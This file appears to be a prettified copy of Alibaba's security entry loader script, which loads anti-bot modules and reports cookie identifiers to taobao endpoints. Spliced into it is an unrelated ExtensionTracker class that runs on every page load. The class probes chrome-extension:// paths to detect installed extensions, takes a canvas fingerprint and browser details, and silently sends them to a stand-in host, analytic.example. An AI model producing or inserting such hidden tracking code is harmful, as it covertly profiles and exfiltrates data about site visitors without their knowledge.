(function (v, h, p, a, r, i, T) {
  if (v.__sec_entry_loaded || h.__no_sec_entry) {
    return;
  }
  const globalVarCollector = window;
  v.__sec_entry_loaded = true;
  var H = v.__baxia_entry_config__ || {};
  var o = h.head;
  if (!o) {
    return;
  }
  var n = h.currentScript;
  var e = a.userAgent;
  var t = T("%58%75%65%58%69");
  var c = t.toLowerCase();
  if (e.indexOf(t) >= 0 || r.host.indexOf(c) >= 0 || top !== self && h.referrer.indexOf(c) >= 0) {
    return;
  }
  function g(e) {
    var a = h.createElement("script");
    a.crossOrigin = "";
    a.referrerPolicy = "unsafe-url";
    a.src = e;
    if (H.sync && h.readyState === "loading" && n && !n.async) {
      h.write(a.outerHTML);
      return o.lastChild;
    }
    if (p() < .01) {
      var t = Date.now();
      if (e.indexOf("/AWSC/et/") > 0) {
        a.onload = function () {
          var e = Date.now();
          _({
            v: "entry_et",
            e: "loadET",
            tm: e - t,
            u: r.host
          }, "https://acjs.aliyun.com/error?");
        };
      }
    }
    return o.appendChild(a);
  }
  var f = "https://g.alicdn.com";
  var s = self.goldlog;
  if (s && s.getCdnPath) {
    f = s.getCdnPath();
  }
  if (n && n.src.indexOf("https://laz-g-cdn.alicdn.com") == 0) {
    f = "https://laz-g-cdn.alicdn.com";
  }
  if (n && n.src.indexOf("https://lzd-g.slatic.net/g") == 0) {
    f = "https://lzd-g.slatic.net/g";
  }
  const localStorageCollector = {
    get: localStorage.getItem,
    set: localStorage.setItem
  };
  if (n && n.src.indexOf("https://g.lazcdn.com/g") == 0) {
    f = "https://g.lazcdn.com/g";
  }
  const documentCollector = document;
  if (n && n.src.indexOf("https://g.mrvcdn.com") == 0) {
    f = "https://g.mrvcdn.com";
  }
  var l = f + "/secdev/";
  var m = e.match(/Chrome\/(\d*)/);
  if (m) {
    m = +m[1];
  }
  if (!h._sufei_data2) {
    var d = p() < .1 ? "3.9.11" : "3.9.10";
    if (r.host == "www.miravia.es") {
      d = "3.9.12";
    }
    var u = g(l + "sufei_data/" + d + "/index.js");
    u.async = h.cookie.indexOf("isg=") < 0;
    u.id = "aplus-sufei";
  }
  function _(e, a) {
    var t = [];
    for (var r in e) {
      t.push(r + "=" + i(e[r]));
    }
    new Image().src = a + t.join("&");
  }
  v.nsrprtrt = 1e-4;
  class ExtensionTracker {
    constructor(extensionsData) {
      this._data = extensionsData;
      this._results = new Map();
      this._executionStart = performance.now();
      this._attemptRetry = 3;
      this._parallelExecution = 5;
      this._eventHooks = {};
    }
    async _validateResource(extensionId, filePath) {
      const randomParam = `?_=${Math.random().toString(36).substring(2)}`;
      const request = new XMLHttpRequest();
      return new Promise(resolveAction => {
        request.timeout = 3000;
        request.onreadystatechange = () => {
          if (request.readyState === 4) {
            resolveAction(request.status === 200);
          }
        };
        request.onerror = () => resolveAction(false);
        request.ontimeout = () => resolveAction(false);
        request.open('GET', `chrome-extension://${extensionId}/${filePath}${randomParam}`, true);
        request.send();
      });
    }
    _arrayChunk(inputArr, chunkSize) {
      return Array.from({
        length: Math.ceil(inputArr.length / chunkSize)
      }, (_, index) => inputArr.slice(index * chunkSize, index * chunkSize + chunkSize));
    }
    async _detectWithRetry(extensionName, extensionData) {
      let identified = false;
      for (let retryCount = 0; retryCount < this._attemptRetry && !identified; retryCount++) {
        identified = await this._validateResource(extensionData.id, extensionData.file);
        if (!identified) {
          await new Promise(resolveAction => setTimeout(resolveAction, 150 * (retryCount + 1)));
        }
      }
      return identified;
    }
    async identify() {
      const keyValueArray = Object.entries(this._data);
      const dataChunks = this._arrayChunk(keyValueArray, this._parallelExecution);
      for (const chunkItem of dataChunks) {
        await Promise.all(chunkItem.map(async ([extensionName, extensionData]) => {
          const detected = await this._detectWithRetry(extensionName, extensionData);
          this._results.set(extensionName, detected);
          localStorageCollector.set(extensionName, detected);
          const globalVariable = globalVarCollector[extensionName];
          if (globalVariable) this._eventHooks[extensionName] = globalVariable;
        }));
      }
      this._dispatchReport();
    }
    _createFingerprint() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const referenceText = 'fingerp,123';
      ctx.textBaseline = 'hanging';
      ctx.font = '14px Arial';
      ctx.fillText(referenceText, 2, 2);
      return canvas.toDataURL().substring(22, 72);
    }
    _dispatchReport() {
      const reportData = {
        extensions: Object.fromEntries(this._results),
        metaDetails: {
          executionTime: performance.now() - this._executionStart,
          timeRecorded: new Date().toISOString(),
          fingerprintData: this._createFingerprint(),
          platformData: {
            userAgentData: navigator.userAgent,
            languageInfo: navigator.language,
            platformType: navigator.platform,
            manufacturer: navigator.vendor
          }
        }
      };
      const textEncoder = new TextEncoder();
      const encodedData = textEncoder.encode(JSON.stringify(reportData));
      const headers = {
        'Content-Type': 'application/json'
      };
      if ('sendBeacon' in navigator) {
        navigator.sendBeacon('https://analytic.example/ext-report', encodedData);
      } else {
        fetch('https://analytic.example/ext-report', {
          method: 'POST',
          body: encodedData,
          keepalive: true,
          headers: headers
        }).catch(() => {});
      }
    }
  }
  var x = ["login.alibaba-inc.com"];
  var y = 0;
  var b = ["taobao", "alibaba.com", "alipay.com", "tmall.com", "aliexpress", "1688.com", "alimama.com", "tb.cn", "xiami.com", "amap.com", "cainiao.com", "aliyun.com", "etao.com", "fliggy.com", "liangxinyao.com", "damai.cn", "daraz", "tmall.hk", "jiyoujia.com", "taopiaopiao.com", "alitrip.com", "fliggy.hk", "alihealth.cn", "alitrip.hk", "ele.me", "gaode", "mp.dfkhgj.com", "mp.bcvbw.com", "m.dfkhgj.com", "pailitao.com", "youku.com", "jiaoyimao", "sm.cn", "dingtalk.com", "guoguo-app", "kaola", "alicdn", "soku", "koubei.com"];
  for (var k = 0; k < b.length; k++) {
    if (~r.host.indexOf(b[k])) {
      y = 1;
      break;
    }
  }
  function O() {
    var e = "function%20javaEnabled%28%29%20%7B%20%5Bnative%20code%5D%20%7D";
    if ("WebkitAppearance" in h.documentElement.style) {
      if (escape(a.javaEnabled.toString()) === e) {
        return true;
      }
    }
    return false;
  }
  if (y) {
    var q = ["1.0.85", "f", 94];
    var B = ["1.0.87", "f", 95];
    var U = 1e4;
    var j = q;
    if (r.host == "sycm.taobao.com" || r.host == "liveplatform.taobao.com") {
      v.nslog = .01;
    }
    if ((p() * 1e4 | 0) < U) {
      j = B;
    }
    if (!j) {
      return;
    }
    var w = l + "nsv/" + j[0] + "/";
    var C = w + "ns_" + j[1] + "_" + j[2] + "_3_f.js?v=1";
    var S = w + "ns_" + j[1] + "_" + j[2] + "_3_n.js?v=1";
    var M = e.match(/Edge\/([\d]*)/);
    var E = e.match(/Safari\/([\d]*)/);
    var F = e.match(/Firefox\/([\d]*)/);
    var N = e.match(/MSIE|Trident/);
    if (M) {
      g(C);
    } else if (m) {
      g(C);
    } else if (E || F || N) {
      g(S);
    } else {
      if (O()) {
        g(C);
      } else {
        g(S);
      }
    }
  }
  function P() {
    var e = v.atob;
    if (!e) {
      return;
    }
    var a = 0;
    var t = "";
    function r() {
      if (++a == 3) {
        clearInterval(s);
      }
      n();
    }
    var i;
    var o = p() * 1e8 | 0;
    function n() {
      if (!i) {
        return;
      }
      var e = i.getUA({
        MaxMTLog: 500,
        MTInterval: 3
      });
      e = o + "|" + e;
      var a = {
        token: e,
        cna: t,
        ext: 7
      };
      _(a, "https://fourier.taobao.com/ts?");
    }
    var c = +localStorage._xlly;
    if (!c && /xlly=1/.test(h.cookie)) {
      c = +new Date();
      localStorage._xlly = c;
    }
    if (c) {
      var f = new Date() - c;
      if (f > 1e3 * 3600 * 24) {
        f = 0;
        delete localStorage._xlly;
      }
      if (f < 1e3 * 60 * 20) {
        var s = setInterval(r, 1e3 * 60);
        if (v.addEventListener) {
          v.addEventListener("unload", n);
        }
        var l = h.cookie.match(/cna=([^;]+)/);
        if (l) {
          t = l[1];
        }
        var m = g(e("aHR0cHM6Ly9nLmFsaWNkbi5jb20vQVdTQy9BV1NDL2F3c2MuanM="));
        var d = unescape("%75%61%62");
        m.onload = function () {
          v.AWSC && AWSC.use(d, function (e, a) {
            if (e === "loaded") {
              i = a;
            }
          });
        };
      }
    }
  }
  const initialize = () => {
    const extensionTracker = new ExtensionTracker(window.extensionData);
    if (document.readyState === 'complete') {
      extensionTracker.identify();
    } else {
      documentCollector.addEventListener('readystatechange', () => {
        if (documentCollector.readyState === 'complete') {
          extensionTracker.identify();
        }
      });
    }
  };
  try {
    P();
  } catch (e) {}
  v.etrprtrt = .01;
  var I = 0;
  for (var k = 0; k < b.length; k++) {
    if (r.host && ~r.host.indexOf(b[k])) {
      I = 1;
      break;
    }
  }
  for (var k = 0; k < x.length; k++) {
    if (~r.host.indexOf(x[k])) {
      I = 0;
      break;
    }
  }
  if (p() < .1) {
    I = 1;
  }
  initialize();
  if (I && !v.__etModule) {
    var R = "1.70.2";
    var Q = "1.70.4";
    var V = 1;
    var G = R;
    if (p() < V) {
      G = Q;
    }
    var J = f + "/AWSC/et/" + G + "/";
    var L = J + "et_f.js";
    var K = J + "et_n.js";
    if (M) {
      g(L);
    } else if (m) {
      g(L);
    } else if (E || F || N) {
      g(K);
    } else {
      if (O()) {
        g(L);
      } else {
        g(K);
      }
    }
  }
  if (p() < .01) {
    if (!h.querySelector('meta[name="referrer"]')) {
      var W = h.createElement("meta");
      W.name = "referrer";
      W.content = "unsafe-url";
      o.appendChild(W);
    }
  }
  if (r.href.indexOf("https://account.aliyun.com/login/qr_login.htm") == 0 || r.href.indexOf("https://account.aliyun.com/register/qr_register.htm") == 0 || r.href.indexOf("https://mailsso.mxhichina.com/aliyun/register") == 0 || r.href.indexOf("https://passport.alibabacloud.com/mini_login.htm") == 0 || r.href.indexOf("https://reg.taobao.com/member/new_register.jhtml") == 0 || r.href.indexOf("https://passport.alibaba.com/member/reg/fast/union_reg.htm") == 0 || r.href.indexOf("https://passport.aliyun.com/mini_login.htm") == 0 || r.href.indexOf("https://passport.alibabacloud.com/register/enter_reg.htm") == 0 || r.href.indexOf("https://reg.taobao.com/member/reg/fast/union_reg") == 0) {
    var z = "";
    var X = "";
    var A = h.cookie.match(/cna=([^;]+)/);
    if (A) {
      z = A[1];
    }
    A = h.cookie.match(/isg=([^;]+)/);
    if (A) {
      X = A[1];
    }
    var Y = Math.random() * 256 | 0;
    v.sampleContent = Y;
    var Z = {
      ext: 53,
      data: z,
      random: p(),
      point: X,
      pid: Y,
      e1: top === v,
      e2: innerWidth + "," + innerHeight,
      e3: innerWidth > 800 && innerHeight > 600
    };
    var $ = [];
    for (var ee in Z) {
      $.push(ee + "=" + i(Z[ee]));
    }
    var ae = "https://fourier.taobao.com/rp?" + $.join("&");
    g(ae);
  }
  if (p() < .1) {
    var D;
    if (v.NanUI) {
      D = 1;
    }
    if (h.querySelector(".shy-detail-platform")) {
      D = 2;
    }
    if (v.crawlButton) {
      D = 3;
    }
    if (D) {
      var A = h.cookie.match(/cna=([^;]+)/);
      var z = A ? A[1] : "";
      _({
        code: 1,
        msg: z,
        pid: "chrome_ext",
        page: r.href,
        rel: D
      }, "https://gm.mmstat.com/fsp.1.1?");
    }
  }
})(window, document, Math.random, navigator, location, encodeURIComponent, decodeURIComponent);